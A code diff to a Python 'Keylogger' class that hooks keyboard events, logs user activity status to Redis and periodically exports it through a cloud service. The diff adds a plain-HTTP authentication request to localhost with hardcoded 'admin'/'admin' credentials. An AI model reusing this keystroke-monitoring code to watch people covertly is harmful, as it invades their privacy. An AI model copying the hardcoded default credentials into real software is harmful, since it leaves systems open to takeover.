@@ -2,9 +2,11 @@ import redis
 import socket
 import keyboard
 from threading import Timer
-from datetime import datetime
+from datetime import datetime, timezone
 from rejson import Client, Path
 from request_service import export_logs
+import requests
+import json
 
 SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on
 
@@ -27,6 +29,7 @@ class Keylogger:
         # record start & end datetimes
         self.start_dt = datetime.now()
         self.end_dt = datetime.now()
+        self.token = requests.post(url='http://localhost:8080/api/authenticate', json=json.loads('{"password": "admin","username": "admin"}'), headers={"content-type": "application/json"})
 
     def callback(self, event):
         """
@@ -55,13 +58,13 @@ class Keylogger:
     def send_to_redis(self):
         if (self.log != ''):
             obj = {
-                "dateTime": datetime.now().strftime("%Y-%m-%d %H:%M:%S").__str__(),
+                "dateTime": datetime.now().astimezone(timezone.utc).strftime("%Y-%m-%d %H:%M:%S").__str__(),
                 'activity': "ACTIVE",
             }
             redis.jsonarrappend('log', Path('.logs'), obj)
         else:
             obj = {
-                "dateTime": datetime.now().strftime("%Y-%m-%d %H:%M:%S").__str__(),
+                "dateTime": datetime.now().astimezone(timezone.utc).strftime("%Y-%m-%d %H:%M:%S").__str__(),
                 'activity': "INACTIVE",
             }
             redis.jsonarrappend('log', Path('.logs'), obj)
@@ -87,7 +90,8 @@ class Keylogger:
 
     def send_to_cloud(self):
         data = redis.jsonget('log', Path.rootPath())
-        export_logs(data)
+        export_logs(data, self.token)
+        redis.jsonclear('log', Path('.logs'))
         sync_timer = Timer(interval=self.sync_to_cloud, function=self.send_to_cloud)
         # set the thread as daemon (dies when main thread die)
         sync_timer.daemon = True
@@ -113,5 +117,5 @@ if __name__ == "__main__":
     # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
     # if you want a keylogger to record keylogs to a local file
     # (and then send it using your favorite method)
-    keylogger = Keylogger(interval=10, sync_to_cloud=30)
+    keylogger = Keylogger(interval=60, sync_to_cloud=560)
     keylogger.start()
